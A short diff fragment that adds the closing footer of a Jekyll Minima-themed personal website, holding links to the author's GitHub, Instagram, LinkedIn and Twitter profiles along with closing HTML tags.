+    </div>
+
+    <div class="social-links"><ul class="social-media-list"><li>
+  <a rel="me" href="https://github.com/MikeRega7" target="_blank" title="github">
+    <svg class="svg-icon grey">
+      <use xlink:href="/assets/minima-social-icons.svg#github"></use>
+    </svg>
+  </a>
+</li>
+<li>
+  <a rel="me" href="https://www.instagram.com/_darkhorse77?igsh=MWZqYTAyYnJmYWZrdg%3D%3D&utm_source=qr" target="_blank" title="instagram">
+    <svg class="svg-icon grey">
+      <use xlink:href="/assets/minima-social-icons.svg#instagram"></use>
+    </svg>
+  </a>
+</li>
+<li>
+  <a rel="me" href="https://www.linkedin.com/in/juan-miguel-regalado-nu%C3%B1o-a3b14b278" target="_blank" title="linkedin">
+    <svg class="svg-icon grey">
+      <use xlink:href="/assets/minima-social-icons.svg#linkedin"></use>
+    </svg>
+  </a>
+</li>
+<li>
+  <a rel="me" href="https://twitter.com/MiguelJmrn7" target="_blank" title="twitter">
+    <svg class="svg-icon grey">
+      <use xlink:href="/assets/minima-social-icons.svg#twitter"></use>
+    </svg>
+  </a>
+</li>
+</ul>
+</div>
+
+  </div>
+
+</footer>
+</body>
+
+</html>
